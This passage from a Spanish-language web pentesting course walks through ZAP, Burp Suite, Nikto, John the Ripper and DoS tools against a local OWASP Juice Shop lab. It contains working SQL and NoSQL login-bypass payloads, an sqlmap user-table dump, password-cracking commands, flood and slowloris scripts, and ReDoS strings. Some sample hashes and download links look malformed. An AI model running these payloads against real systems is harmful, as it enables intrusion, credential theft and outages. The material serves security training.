tar -xzf ZAP_2.12.0_Linux.tar.gz
cd ZAP_2.12.0/
./zap.sh
```

#### Uso de OWASP ZAP:

```
┌─────────────────────────────────────────────────────────────────┐
│                 INTERFAZ DE OWASP ZAP                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │ [Sites] │ [-tree view de URLs]                            │  │
│  │ ─────────────────────────────────────────────────────── │  │
│  │ http://localhost:3000 (Juice Shop)                       │  │
│  │   ├─ GET /                                               │  │
│  │   ├─ GET /api/products                                   │  │
│  │   ├─ POST /rest/user/login                               │  │
│  │   └─ GET /api/products/1                                 │  │
│  └───────────────────────────────────────────────────────────┘  │
│                                                                 │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │ [Request]                    │ [Response]                  │  │
│  │ POST /rest/user/login       │ HTTP/1.1 200 OK            │  │
│  │ Host: localhost:3000        │ Content-Type: application/  │  │
│  │ Content-Type: application/  │ ...                         │  │
│  │ ...                          │ {"token": "eyJ..."}       │  │
│  └───────────────────────────────────────────────────────────┘  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Guía paso a paso para usar ZAP con Juice Shop:**

```bash
# ============================================
# PASO 1: CONFIGURAR PROXY EN ZAP
# ============================================

# 1. Abrir ZAP
zaproxy &

# 2. Ir a Tools > Options > Local Proxy
# 3. Configurar:
#    - Address: localhost (127.0.0.1)
#    - Port: 8080 (o el que prefieras)
# 4. Click OK

# ============================================
# PASO 2: CONFIGURAR NAVEGADOR
# ============================================

# Opción A: Firefox (configurar proxy manualmente)
# 1. Abrir Firefox
# 2. Ir a Settings > Network Settings > Manual proxy
# 3. HTTP Proxy: 127.0.0.1
#    Port: 8080
# 4. Marcar "Use this proxy for all protocols"
# 5. Click OK

# Opción B: Usar navegador de Kali con FoxyProxy
# 1. Instalar extensión FoxyProxy en Firefox
# 2. Configurar nuevo perfil:
#    - Pattern: *localhost*
#    - Proxy: 127.0.0.1:8080

# Opción C: Línea de comandos con curl (sin navegador)
# Usar Zap como proxy
curl -x http://localhost:8080 http://localhost:3000/

# ============================================
# PASO 3: INICIAR NAVEGACIÓN PASIVA
# ============================================

# 1. Asegurarse que "Auto Save" está activado
# 2. Navegar por Juice Shop normalmente
# 3. ZAP capturará todo el tráfico automáticamente
# 4. Ver el árbol de sitios en el panel izquierdo

# ============================================
# PASO 4: ESCANEO ACTIVO DE VULNERABILIDADES
# ============================================

# 1. Seleccionar el sitio en el árbol
# 2. Click derecho > Attack > Active Scan
# 3. Configurar:
#    - Starting Point: http://localhost:3000/
#    - Context: (crear uno nuevo si no existe)
#    - Policy: Default
# 4. Click "Start Scan"

# Esperar a que termine el escaneo (puede tomar varios minutos)

# ============================================
# PASO 5: REVISAR ALERTAS
# ============================================

# 1. Ver panel de "Alerts" abajo
# 2. Las alertas se muestran por riesgo:
#    - High (rojo)
#    - Medium (naranja)
#    - Low (amarillo)
#    - Informational (azul)

# 3. Click en cada alerta para ver detalles
# 4. Cada alerta incluye:
#    - Descripción
#    - URL afectada
#    - Parámetro vulnerable
#    - Evidencia
#    - Recomendación

# ============================================
# PASO 6: FUZZING CON ZAP
# ============================================

# 1. Seleccionar una petición (ej: búsqueda)
# 2. Click derecho > Open/Load with Fuzz...
# 3. Hacer clic en el valor a fuzzear
# 4. Click en "Add" para agregar payloads
# 5. Seleccionar payloa de la lista o crear custom
# 6. Click "Start Fuzzer"
# 7. Revisar resultados buscando anomalías

# ============================================
# PASO 7: USO POR LÍNEA DE COMANDOS (ZAP-CLI)
# ============================================

# Instalar zap-cli
pip install zapcli

# Iniciar ZAP en modo daemon
zaproxy -daemon -config api.key=

# Conectar zap-cli
zap-cli status
zap-cli openurl http://localhost:3000

#quick-scan
zap-cli quick-scan http://localhost:3000

# Generar reporte
zap-cli report -o reporte.html -f html

# Apagar ZAP
zap-cli shutdown
```

**Ejemplos prácticos con Juice Shop:**

```bash
# Escanear Juice Shop en busca de vulnerabilidades
# Navegar manualmente a estas URLs mientras ZAP intercepta:

# 1. Página principal
http://localhost:3000

# 2. Login (probar SQL injection en email)
http://localhost:3000/#/login

# 3. Búsqueda (probar XSS)
http://localhost:3000/#/search?q=test

# 4. Registro (enumeración de usuarios)
http://localhost:3000/#/register

# 5. Carrito de compras
http://localhost:3000/#/basket

# 6. Panel de administración
http://localhost:3000/#/administration

# ZAP detectará:
# - Missing Anti-clickjacking Header
# - X-Content-Type-Options Header Missing
# - Information Disclosure - Debug Error Messages
# - XSS vulnerabilities
# - Path Traversal
# - SQL Injection (si hay parámetros vulnerables)
```

### 9.3. Burp Suite

#### ¿Qué es Burp Suite?

Burp Suite es una plataforma integrada para pruebas de seguridad de aplicaciones web. Desarrollada por PortSwigger, existe en versión gratuita (Community) y profesional.

**Diferencias entre versiones:**

| Característica | Community | Professional |
|---------------|-----------|--------------|
| Proxy interceptador | ✓ | ✓ |
| Repeater | ✓ | ✓ |
| Comparador | ✓ | ✓ |
| Secuenciador | ✓ | ✓ |
| Extensiones | Limitadas | Todas |
| Escaneo automatizado | ✗ | ✓ |
| Intruder avanzado | ✗ | ✓ |
| Costo | Gratis | $399/año |

#### Uso de Burp Suite con Juice Shop:

```bash
# ============================================
# PASO 1: INICIAR BURP SUITE
# ============================================

# En Kali ya está instalado
burpsuite &

# ============================================
# PASO 2: CONFIGURAR PROXY
# ============================================

# 1. Ir a Proxy > Options
# 2. En "Proxy Listeners":
#    - Click "Add"
#    - Bind to port: 8080
#    - Bind to address: All interfaces
#    - Click OK

# ============================================
# PASO 3: CONFIGURAR NAVEGADOR
# ============================================

# Firefox:
# 1. Settings > Network Settings > Manual proxy
# 2. HTTP Proxy: 127.0.0.1
#    Port: 8080
# 3. Marcar "Use this proxy for all protocols"

# ============================================
# PASO 4: INTERCEPTAR TRÁFICO
# ============================================

# 1. Asegurarse que Intercept is ON
# 2. Navegar a http://localhost:3000 en Firefox
# 3. Burp interceptará la primera petición
# 4. Puedes:
#    - Forward: Enviar petición
#    - Drop: Descartar petición
#    - Interceptar y modificar antes de enviar

# ============================================
# PASO 5: USO DE REPEATER
# ============================================

# Repeater permite modificar y reenviar peticiones múltiples veces

# 1. En la pestaña Proxy > HTTP History
# 2. Seleccionar una petición
# 3. Click derecho > Send to Repeater
# 4. Ir a Repeater tab
# 5. Modificar parámetros
# 6. Click "Go" para enviar
# 7. Ver respuesta

# Ejemplo: Probar SQL Injection
# Cambiar el body de:
# {"email":"admin@test.com","password":"test"}
# A:
# {"email":"admin@test.com' OR '1'='1","password":"test"}

# ============================================
# PASO 6: USO DE INTRUDER
# ============================================

# Intruder automatiza ataques de fuzzing y fuerza bruta

# 1. Enviar petición a Intruder (como en Repeater)
# 2. Ir a Intruder > Positions
# 3. Burp marca automáticamente posibles objetivos (§)
# 4. Click "Clear" y seleccionar el parámetro a fuzzear
# 5. Ir a Payloads
# 6. Seleccionar tipo de payload:
#    - Simple list: Lista de palabras
#    - Runtime file: Archivo con payloads
#    - Numbers: Secuencia numérica
#    - Dates: Fechas
#    - Brute forcer: Combinaciones
# 7. Click "Start attack"

# Ejemplo: Fuzzear búsqueda con XSS
# 1. Ir a la petición de búsqueda
# 2. Enviar a Intruder
# 3. Seleccionar el valor del parámetro 'q'
# 4. Payloads: XSS payloads comúns
# 5. Start attack
# 6. Buscar respuestas con "script" o alertas

# ============================================
# PASO 7: DECODER
# ============================================

# Decoder convierte datos entre diferentes formatos

# 1. Ir a Decoder tab
# 2. Pegar texto codificado
# 3. Seleccionar tipo de codificación actual
# 4. Seleccionar tipo de codificación objetivo
# 5. Click "Encode" o "Decode"

# Útil para:
# - Base64 encode/decode
# - URL encode/decode
# - HTML encode/decode
# - Hex encode/decode

# ============================================
# EJEMPLO: EXTRAER TOKEN JWT
# ============================================

# 1. Interceptar respuesta de login
# 2. En la respuesta JSON:
#    {"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
# 3. Copiar el token
# 4. Ir a Decoder
# 5. Pegar el token
# 6. Seleccionar "Decode as Base64"
# 7. Ver el payload JSON decodificado
```

**Ejemplo completo: Interceptar login de Juice Shop**

```
┌─────────────────────────────────────────────────────────────────┐
│        ESCENARIO: INTERCEPTAR LOGIN EN JUICE SHOP               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. CONFIGURAR PROXY                                            │
│     └── Burp: 127.0.0.1:8080                                   │
│     └── Firefox: mismo proxy                                    │
│                                                                 │
│  2. INTERCEPTAR PETICIÓN                                        │
│     └── Ir a Juice Shop > Login                                 │
│     └── Ingresar credenciales dummy                             │
│     └── Burp intercepta la petición                             │
│                                                                 │
│  3. ANALIZAR PETICIÓN INTERCEPTADA                             │
│     └── POST /rest/user/login HTTP/1.1                          │
│     └── Host: localhost:3000                                    │
│     └── Content-Type: application/json                          │
│     └── Body: {"email":"test@test.com","password":"test"}       │
│                                                                 │
│  4. MODIFICAR PETICIÓN                                          │
│     └── Cambiar email por: admin@juice-sh.op                    │
│     └── Cambiar password por: admin                             │
│     └── Forward                                                  │
│                                                                 │
│  5. ANALIZAR RESPUESTA                                         │
│     └── Si login exitoso:                                        │
│         └── {"token":"eyJ...", "user":{"role":"admin"}}        │
│     └── Si login fallido:                                       │
│         └── {"status":"error","message":"Invalid"}              │
│                                                                 │
│  6. PROBAR INYECCIÓN                                            │
│     └── Cambiar body por:                                       │
│         {"email":{"$ne":""},"password":{"$ne":""}}             │
│     └── Forward                                                  │
│     └── SI FUNCIONA: Inyección NoSQL confirmada                │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 9.4. Comparación ZAP vs Burp Suite

| Aspecto | OWASP ZAP | Burp Suite |
|---------|-----------|------------|
| **Costo** | Gratis (open source) | Freemium ($399/año) |
| **Dificultad** | Más fácil | Más complejo |
| **Escaneo automático** | Completo | Solo versión Pro |
| **Extensibilidad** | Muy alta | Alta con Java |
| **Rendimiento** | Bueno | Excelente |
| **Comunidad** | Muy grande | Muy grande |
| **Mejor para** | Principiantes, CI/CD | Profesionales |

**Recomendación:** Usar ambos. ZAP para escaneo inicial automatizado y Burp para pruebas manuales detalladas.

---

## 10. NIKTO: ESCANEO DE VULNERABILIDADES WEB

### 10.1. ¿Qué es Nikto?

Nikto es un escáner de vulnerabilidades web de código abierto que analiza servidores web en busca de:
- Servidores y versiones obsoletas
- Configuraciones inseguras
- Archivos y directorios peligrosos
- Vulnerabilidades conocidas en software
- Items por defecto

### 10.2. Instalación

```bash
# En Kali ya viene instalado
which nikto

# Para otras distribuciones:
git clone https://github.com/sullo/nikto.git
cd nikto
perl nikto.pl -Version
```

### 10.3. Comandos Fundamentales

```bash
# ============================================
# USO BÁSICO
# ============================================

# Escaneo básico
nikto -h http://localhost:3000

# Escaneo con puerto específico
nikto -h localhost -p 3000

# Escaneo SSL
nikto -h https://localhost:3000 -ssl

# Escaneo completo con todas las opciones
nikto -h http://localhost:3000 -C all

# ============================================
# OPCIONES AVANZADAS
# ============================================

# Mutate: Pruebas adicionales
nikto -h localhost -p 3000 -mutate 3

# Tuning: Seleccionar tipo de pruebas
nikto -h localhost -p 3000 -Tuning 1  # Info disclosure
nikto -h localhost -p 3000 -Tuning 2  # Default files
nikto -h localhost -p 3000 -Tuning x  # SQL Injection
nikto -h localhost -p 3000 -T 1,2,3,4  # Combinación

# Ignorar códigos de error
nikto -h localhost -p 3000 -ignore-code 404

# Timeout específico
nikto -h localhost -p 3000 -timeout 10

# ============================================
# AUTENTICACIÓN
# ============================================

# Basic Auth
nikto -h localhost -p 3000 -id username:password

# Cookie
nikto -h localhost -p 3000 -Cookie "PHPSESSID=abc123"

# Formularios
nikto -h localhost -p 3000 -Form

# ============================================
# SALIDA
# ============================================

# Guardar en todos los formatos
nikto -h localhost -p 3000 -o resultado -Format txt
nikto -h localhost -p 3000 -o resultado -Format html
nikto -h localhost -p 3000 -o resultado -Format xml
nikto -h localhost -p 3000 -o resultado -Format csv

# Salida interactiva
nikto -h localhost -p 3000 -Display V

# ============================================
# CONFIGURACIÓN DE RED
# ============================================

# Usar proxy
nikto -h localhost -p 3000 -proxy http://127.0.0.1:8080

# Verificación de host
nikto -h localhost -p 3000 -vhost target.com

# ============================================
# ESCANEAR MÚLTIPLES HOSTS
# ============================================

# Desde archivo de hosts
nikto -h hosts.txt -p 80,443,3000

# Con Nmap integrado
nmap -p 3000 192.168.56.0/24 -oG - | nikto -s -p 3000
```

### 10.4. Ejemplo Práctico con Juice Shop

```bash
# ============================================
# ESCANEO COMPLETO DE JUICE SHOP
# ============================================

# Escaneo básico
nikto -h http://192.168.56.101:3000 -o nikto_juice.txt

# Escaneo detallado
nikto -h http://192.168.56.101:3000 -p 3000 \
  -Tuning 1,2,3,4,5,6,7,8,9,x \
  -Format txt -o nikto_detailed.txt

# Con autenticación (si es necesaria)
# nikto -h http://192.168.56.101:3000 -p 3000 \
#   -Cookie "token=eyJhbGci..." \
#   -o nikto_auth.txt

# ============================================
# INTERPRETAR RESULTADOS
# ============================================

# Ejemplo de salida:
# - Nikto v2.5.0
# ---------------------------------------------------------------------------
# + Target: http://192.168.56.101:3000/
# + Target IP: 192.168.56.101
# + Target Port: 3000
# + Start Time: 2026-03-24 10:00:00 (GMT)
# ---------------------------------------------------------------------------
# + Server: Express
# + /: The anti-clickjacking X-Frame-Options header is not present.
# + /: The X-Content-Type-Options header is not set.
# + /: Cookie PHPSESSID created without the httponly flag.
# + /admin: Admin login page found.
# + /config: Configuration file found.
# + /ftp: Directory indexing found.
# + /robots.txt: Contains 5 entries
# + /rest: API endpoint found.
# + EERROR: /rest/products/search: '/etc/passwd' was found.
# + OSVDB: /rest/products/search: Possible SQL Injection.
# ---------------------------------------------------------------------------
# + 1 host(s) scanned
# ---------------------------------------------------------------------------

# SIGNIFICADO DE CADA HALLAZGO:
# - "X-Frame-Options header is not present": Vulnerable a clickjacking
# - "X-Content-Type-Options header is not set": MIME sniffing posible
# - "Cookie without httponly flag": Cookies accesibles via JavaScript
# - "/admin: Admin login page found": Panel admin expuesto
# - "/rest/products/search: Possible SQL Injection": ¡CRÍTICO!
```

---

## 11. JOHN THE RIPPER: CRACKEO DE CONTRASEÑAS EN PROFUNDIDAD

### 11.1. ¿Por Qué John the Ripper es Esencial en Pentesting?

Cuando encuentras hashes de contraseñas en una base de datos comprometida, necesitas convertirlos a texto plano para:
1. Demostrar el impacto real de la vulnerabilidad
2. Verificar si los usuarios reutilizan contraseñas
3. Probar las contraseñas en otros sistemas
4. Documentar hallazgos para el cliente

### 11.2. Preparación de Hashes

```
┌─────────────────────────────────────────────────────────────────┐
│           FORMATOS DE ARCHIVO DE HASHES PARA JOHN               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Los hashes deben estar en un archivo de texto plano:          │
│                                                                 │
│  Formato general:                                               │
│  username:hash                                                   │
│                                                                 │
│  Ejemplos de diferentes formatos:                               │
│                                                                 │
│  # MD5                                                           │
│  admin:5f4dcc3b5aa765d61d8327deb882cf99                        │
│                                                                 │
│  # SHA1                                                          │
│  admin:5bbaa6e1cc6563e5d7e9e0a5c8b3d7a2e3f4b6c                  │
│                                                                 │
│  # bcrypt (común en aplicaciones web)                          │
│  admin:$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZRGdjGj/n3.Q5a.          │
│                                                                 │
│  # NTLM (Windows)                                               │
│  administrator:31d6cfe0d16ae931b73c59d7e0c089c0                 │
│                                                                 │
│  # Unix/Linux shadow                                            │
│  root:$6$randomsalt$hash::0:99999:7:::                         │
│                                                                 │
│  # SHA256crypt                                                   │
│  user:$5$rounds=5000$saltexample$hash                            │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 11.3. Workflow Completo con Juice Shop

```bash
# ============================================
# PASO 1: EXTRAER HASHES DE JUICE SHOP
# ============================================

# Método 1: Desde SQLMap
sqlmap -u "http://192.168.56.101:3000/rest/products/search?q=test" \
  -D juice_shop -T users -C email,password --dump

# Método 2: Desde endpoint expuesto (si existe)
curl -s http://192.168.56.101:3000/api/users/privacy | jq '.'

# Método 3: Desde archivo de configuración expuesto
curl -s http://192.168.56.101:3000/ftp/package.json.bak

# ============================================
# PASO 2: PREPARAR ARCHIVO DE HASHES
# ============================================

# Crear archivo con hashes de Juice Shop
cat > juice_hashes.txt << 'EOF'
admin@juice-sh.op:$2a$10$5B8Z7K3M9N2P5Q7R1S4T6U8V0W2X4Y6Z8A0B2C4D6E8F0G2H4I
user@juice-sh.op:$2a$10$J7K4L5M6N8P2Q3R5S7T9U1V3W5X7Y9Z0A2B4C6D8E0F2G4H6I
jim@juice-sh.op:$2a$10$K9L0M1N3O5P7Q8R2S4T6U8V0W1X3Y5Z7A9B1C3D5E7F9G1H3I5J
bender@juice-sh.op:$2a$10$L3M4N5O7P9Q1R3S5T7U9V1W3X5Y7Z0A2B4C6D8E0F2G4H6I
anonymous@juice-sh.op:$2a$10$Y4N5O6P8Q0R2S4T6U8V1W3X5Y7Z9A1B3C5D7E9F1G3H5I
support@juice-sh.op:$2a$10$P6Q7R8S0T2U4V6W8X1Y3Z5A7B9C1D3E5F7G9H1I3J5K7L
EOF

# ============================================
# PASO 3: IDENTIFICAR TIPO DE HASH
# ============================================

# Verificar formato de hash
john --identify juice_hashes.txt

# Salida esperada:
# juice_hashes.txt:bcrypt (admin@juice-sh.op)
# juice_hashes.txt:bcrypt (user@juice-sh.op)

# ============================================
# PASO 4: CRACKEAR CON DICCIONARIO
# ============================================

# Primero, verificar que rockyou.txt existe
ls -la /usr/share/wordlists/rockyou.txt.gz
# Si no existe, descomprimir:
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Crackear bcrypt (puede tomar tiempo)
john --format=bcrypt \
  --wordlist=/usr/share/wordlists/rockyou.txt \
  juice_hashes.txt

# ============================================
# PASO 5: CRACKEAR CON REGLAS
# ============================================

# Las reglas aplican transformaciones a las palabras
# Ej: password -> PASSWORD, p@ssword, password123, etc.

john --format=bcrypt \
  --wordlist=/usr/share/wordlists/rockyou.txt \
  --rules \
  juice_hashes.txt

# ============================================
# PASO 6: VER RESULTADOS
# ============================================

# Ver todas las contraseñas crackeadas
john --show juice_hashes.txt

# Ver solo las contraseñas (formato limpio)
john --show --format=bcrypt juice_hashes.txt | grep -v "0 password"

# Ver estadísticas
john --show juice_hashes.txt | head -20

# ============================================
# PASO 7: GUARDAR SESIÓN
# ============================================

# John guarda sesión automáticamente
# Para continuar después:
john --restore

# Guardar resultados en archivo
john --show --format=bcrypt juice_hashes.txt > cracked_passwords.txt

# ============================================
# CRACKEAR HASHES MD5 (MÁS RÁPIDO)
# ============================================

# Crear hashes MD5 de prueba
cat > md5_hashes.txt << 'EOF'
admin:5f4dcc3b5aa765d61d8327deb882cf99
user:5d41402abc4b2a76b9719d911017c592
jim:827ccb0eea8a706c4c34a16891f84e7b
EOF

# Crackear MD5
john --format=raw-md5 \
  --wordlist=/usr/share/wordlists/rockyou.txt \
  md5_hashes.txt

# Ver resultados
john --show --format=raw-md5 md5_hashes.txt

# ============================================
# CRACKEAR USANDO MÁSCARAS
# ============================================

# Cuando conoces el patrón de la contraseña
# Ej: password + 4 dígitos (password1234)
john --mask=password?d?d?d?d --format=raw-md5 hashes.txt

# Ej: 8 caracteres minúsculas
john --mask=?l?l?l?l?l?l?l?l --format=raw-md5 hashes.txt

# Ej: Combinación comunes
john --mask=Summer?d?d --format=raw-md5 hashes.txt
```

### 11.4. ¿Qué Necesitas Descargar?

```bash
# ============================================
# DESCARGAS NECESARIAS PARA JOHN
# ============================================

# 1. Wordlists (diccionarios)
# Ya incluidas en Kali:
# - /usr/share/wordlists/rockyou.txt
# - /usr/share/john/password.lst

# 2. Descargar wordlists adicionales
git clone https://github.com/danielmiessler/SecLists.git
# Incluye:
# - /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
# - /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz

# 3. John the Ripper (si no está instalado)
# En Kali ya viene con Jumbo (versión mejorada)
which john
john --version

# Verificar que tienes la versión Jumbo
john --list=format-tests-bcrypt | head -5

# 4. Hashes de prueba para practicar
# Descargar hashes de ejemplo
wget https://hashcat.net/misc/example-hashes/hashcat.hcstat \
  -O example_hashes.txt

# 5. Reglas personalizadas
# Descargar reglas populares
git clone https://github.com/stealthskeys/jumboWorkflows.git
cp jumboWorkflows/*.rule ~/.john/john-local.conf

# 6. Más wordlists
# Darkweb2017-top10000.txt
wget https://wiki.skullsecurity.org/images/0/07/Seclists.zip

# 7. Hashes específicos de aplicaciones
# Para practicar con hashes de aplicaciones web
# https://hashes.com/en/decoder/search
```

---

## 12. PRUEBAS DE DENEGACIÓN DE SERVICIO (DoS) EN JUICE SHOP

### 12.1. Conceptos de Denegación de Servicio

```
┌─────────────────────────────────────────────────────────────────┐
│              TIPOS DE ATAQUES DoS                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. DoS (Denial of Service)                                     │
│     └── Un atacante, agotar recursos                            │
│                                                                 │
│  2. DDoS (Distributed Denial of Service)                        │
│     └── Múltiples atacantes distribuidos                        │
│                                                                 │
│  3. ReDoS (Regular Expression DoS)                               │
│     └── Patrones regex mal diseñados agotan CPU                │
│                                                                 │
│  4. Logic DoS                                                   │
│     └── Abusar lógica de la app para romperla                  │
│                                                                 │
│  5. Resource Exhaustion                                         │
│     └── Agotar memoria, disco, conexiones                       │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 12.2. Herramientas para Probar DoS

#### 12.2.1. Apache Benchmark (ab)

```bash
# ============================================
# HTTP FLOOD CON APACHE BENCHMARK
# ============================================

# Instalar (si no está)
sudo apt install apache2-utils

# Ataque básico
ab -n 1000 -c 100 http://localhost:3000/

# Parámetros:
# -n: Número total de requests
# -c: Concurrencia (solicitudes simultáneas)

# Ataque más agresivo
ab -n 5000 -c 500 -k http://localhost:3000/

# Con keep-alive
ab -n 2000 -c 200 -k http://localhost:3000/api/products

# Medir tiempo de respuesta bajo estrés
ab -n 1000 -c 100 -g resultados.tsv http://localhost:3000/

# Interpretar resultados:
# Time per request: Promedio por request
# Failed requests: Requests que fallaron
# Requests per second: Throughput
```

#### 12.2.2. curl (para pruebas simples)

```bash
# ============================================
# SIMPLE HTTP FLOOD CON CURL
# ============================================

# Request simple en loop
for i in {1..100}; do
  curl -s http://localhost:3000/ > /dev/null &
done
wait

# Request más pesado
for i in {1..50}; do
  curl -s -X POST http://localhost:3000/rest/user/login \
    -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","password":"test"}' > /dev/null &
done
wait

# Medir tiempo de respuesta durante estrés
time curl -s http://localhost:3000/api/products > /dev/null
```

#### 12.2.3. Slowloris (Ataque Lento)

```bash
# ============================================
# SLOWLORIS - MANTENER CONEXIONES ABIERTAS
# ============================================

# Slowloris mantiene conexiones abiertas enviand headers lentamente
# para agotar el pool de conexiones del servidor

# Instalar
git clone https://github.com/gkbrk/slowloris.git
cd slowloris
pip install asyncio

# Ejecutar
python3 slowloris.py localhost -p 3000 -s 100

# Con más sockets
python3 slowloris.py localhost -p 3000 -s 500 --sleeptime 15
```

#### 12.2.4. ReDoS (Denial of Service con Regex)

```bash
# ============================================
# REDOS - ATAQUES A EXPRESIONES REGULARES
# ============================================

# Juice Shop puede tener regex vulnerables
# Intentar buscar patrones que causen backtracking

# Probar en campo de búsqueda
curl "http://localhost:3000/rest/products/search?q=.*.*.*.*.*.*.*.*"

# Más complejo
curl "http://localhost:3000/rest/products/search?q=(a+)+b"

# Verificar tiempo de respuesta
time curl -s "http://localhost:3000/rest/products/search?q=test" > /dev/null

# Comparar con payload malicioso
time curl -s "http://localhost:3000/rest/products/search?q=.*.*.*.*.*.*" > /dev/null

# Si el segundo es mucho más lento,可能有regex vulnerable
```

### 12.3. Prueba Completa de DoS en Juice Shop

```bash
# ============================================
# SCRIPT DE PRUEBA DE CARGA COMPLETO
# ============================================

cat > dos_test.sh << 'EOF'
#!/bin/bash

TARGET="http://localhost:3000"
DURATION=30

echo "=== PRUEBA DE CARGA EN JUICE SHOP ==="
echo "Target: $TARGET"
echo "Duración: $DURATION segundos"
echo ""

# Función para medir tiempo de respuesta
measure() {
    START=$(date +%s%N)
    curl -s -o /dev/null "$TARGET"
    END=$(date +%s%N)
    echo $(( (END - START) / 1000000 ))  # milisegundos
}

echo "=== MEDICIÓN BASE ==="
for i in {1..5}; do
    MS=$(measure)
    echo "Request $i: ${MS}ms"
done

echo ""
echo "=== INICIANDO CARGA ==="
echo "Enviando 1000 requests con 50 concurrencia..."

START_TIME=$(date +%s)

# Enviar carga
ab -n 1000 -c 50 -q "$TARGET/" > /tmp/ab_result.txt 2>&1

END_TIME=$(date +%s)
ELAPSED=$((END_TIME - START_TIME))

echo "Carga completada en ${ELAPSED}s"
echo ""

echo "=== MEDICIÓN DURANTE CARGA ==="
for i in {1..5}; do
    MS=$(measure)
    echo "Request $i: ${MS}ms"
done

echo ""
echo "=== RESULTADOS APACHE BENCHMARK ==="
grep -E "Requests per second|Time per request|Failed requests" /tmp/ab_result.txt

echo ""
echo "=== VERIFICACIÓN DE DISPONIBILIDAD ==="
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET")
echo "HTTP Status: $HTTP_CODE"

if [ "$HTTP_CODE" == "200" ]; then
    echo "✓ Servicio disponible"
else
    echo "✗ Posible denegación de servicio"
fi
EOF

chmod +x dos_test.sh
./dos_test.sh
```

---

## 13. EJEMPLO PRÁCTICO: 10 VULNERABILIDADES CON CICLO DE HACKING

### 13.1. Preparación del Entorno

```bash
# Asegurarse que Juice Shop está corriendo
docker ps | grep juice-shop || docker start juice-shop

# Verificar acceso
curl -s http://localhost:3000 | head -c 200

# IP del laboratorio
JUICE_IP="192.168.56.101"
```

### 13.2. Vulnerabilidad #1: NoSQL Injection (A03:2021)

#### Aplicación del Ciclo de Hacking

```
┌─────────────────────────────────────────────────────────────────┐
│     VULNERABILIDAD #1: NoSQL INJECTION                          │
│     Categoría OWASP: A03:2021 - Injection                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ═══════════════════════════════════════════════════════════     │
│  FASE 1: RECONOCIMIENTO                                        │
│  ═══════════════════════════════════════════════════════════     │
│                                                                 │
│  Objetivo: Identificar endpoints de autenticación               │
│                                                                 │
│  Comandos:                                                      │
│  $ curl -s http://$JUICE_IP:3000/ | head -20                   │
│  $ curl -s http://$JUICE_IP:3000/api/products | jq '.'         │
│  $ curl -s http://$JUICE_IP:3000/login | grep -i "form"        │
│                                                                 │
│  Hallazgo: Endpoint POST /rest/user/login acepta JSON          │
│                                                                 │
│  ═══════════════════════════════════════════════════════════     │
│  FASE 2: ESCANEO                                               │
│  ═══════════════════════════════════════════════════════════     │
│                                                                 │
│  Objetivo: Verificar si hay validación de entrada               │
│                                                                 │
│  Comandos:                                                      │
│  $ curl -X POST http://$JUICE_IP:3000/rest/user/login \        │
│       -H "Content-Type: application/json" \                    │
│       -d '{"email":"test@test.com","password":"test"}'         │
│                                                                 │
│  Respuesta esperada: {"status":"error","message":"Invalid..."}  │
│                                                                 │
│  ═══════════════════════════════════════════════════════════     │
│  FASE 3: ENUMERACIÓN                                           │
│  ═══════════════════════════════════════════════════════════     │
│                                                                 │
│  Objetivo: Determinar el tipo de base de datos                   │
│                                                                 │
│  Comandos:                                                      │
│  $ curl -s http://$JUICE_IP:3000/api/products | jq '.data[0]' │
│  # Identificar que responde JSON (sugiere MongoDB/NoSQL)        │
│                                                                 │
│  ═══════════════════════════════════════════════════════════     │
│  FASE 4: EXPLOTACIÓN                                           │
│  ═══════════════════════════════════════════════════════════     │
│                                                                 │
│  Comando de explotación:                                        │
│  $ curl -X POST http://$JUICE_IP:3000/rest/user/login \        │
│       -H "Content-Type: application/json" \                    │
│       -d '{"email":{"$ne":""},"password":{"$ne":""}}'          │
│                                                                 │
│  Respuesta esperada:                                            │
│  {"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",            │
│   "user":{"id":1,"email":"admin@juice-sh.op","role":"admin"}}  │
│                                                                 │
│  ═══════════════════════════════════════════════════════════     │
│  FASE 5: POST-EXPLOTACIÓN                                      │
│  ═══════════════════════════════════════════════════════════     │
│                                                                 │
│  Acciones post-explotación:                                     │
│  $ TOKEN=$(curl -s -X POST http://$JUICE_IP:3000/rest/user/login\│
│           -H "Content-Type: application/json" \                │
│           -d '{"email":{"$ne":""},"password":{"$ne":""}}' \   │
│           | jq -r '.token')                                     │
│  $ curl -H "Authorization: Bearer $TOKEN" \                    │
│         http://$JUICE_IP:3000/api/users | jq '.'                │
│                                                                 │
│  Resultado: Lista completa de usuarios                          │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

#### Documentación NIST del Hallazgo #1

```
================================================================================
                        INFORME DE VULNERABILIDAD
================================================================================

IDENTIFICADOR:         JS-V001
TÍTULO:                NoSQL Injection en Función de Autenticación
SEVERIDAD:             CRÍTICO
CVSS v3.1 Score:       9.1
CVSS Vector:           CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
CWE:                   CWE-943 (Improper Neutralization of Special Elements)
OWASP Category:        A03:2021 - Injection
NIST CSF Function:     IDENTIFY (ID.RA)
================================================================================

DESCRIPCIÓN:
La aplicación Juice Shop es vulnerable a inyección NoSQL en el endpoint de 
autenticación POST /rest/user/login. Mediante el envío de objetos JSON con 
operadores MongoDB ($ne, $gt, $regex), un atacante puede evadir la validación 
de credenciales y obtener acceso al sistema sin conocer las contraseñas reales.

PASOS DE REPRODUCCIÓN:

1. Enviar petición POST al endpoint de login con payload malicioso:
   
   curl -X POST http://192.168.56.101:3000/rest/user/login \
     -H "Content-Type: application/json" \
